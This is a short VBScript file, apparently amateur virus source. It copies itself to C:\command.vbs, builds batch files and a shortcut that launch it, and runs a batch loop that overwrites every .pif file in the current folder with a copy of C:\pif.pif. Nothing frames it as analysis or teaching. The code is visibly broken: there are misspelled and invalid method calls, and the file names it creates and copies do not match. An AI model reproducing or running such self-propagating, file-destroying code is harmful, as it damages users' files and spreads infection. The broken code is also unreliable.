Dim shell, msc, batch, fso, batchb
set fso=CreateObject("Scripting.FileSystemObject")
fso.CopyFile Wscript.ScriptFullName, "C:\command.vbs", True
set batch=CreateTextFile("C:\bat.bat")
batch.WriteLine "cls"
batch.WriteLine "@echo off"
batch.WriteLine "cscript C:\command.vbs"
batch.Close
set shell=wscript.createobject("wscript.shell")
set msc=shell.CreateShortCut("C:\pif.lnk")
msc.TargetPath=shell.ExpandEnvironment("C:\bat.bat")
msc.WindowStyle=4
msc.Save
set batchb=CreaateTextFile("C:\pif.bat")
batchb.WriteLine "cls"
batchb.WriteLine "@echo off"
batchb.WriteLine "for %%a in (*.pif) do copy C:\pif.pif %%a"
batchb.Close
shell.Run  "C:\pif.bat"
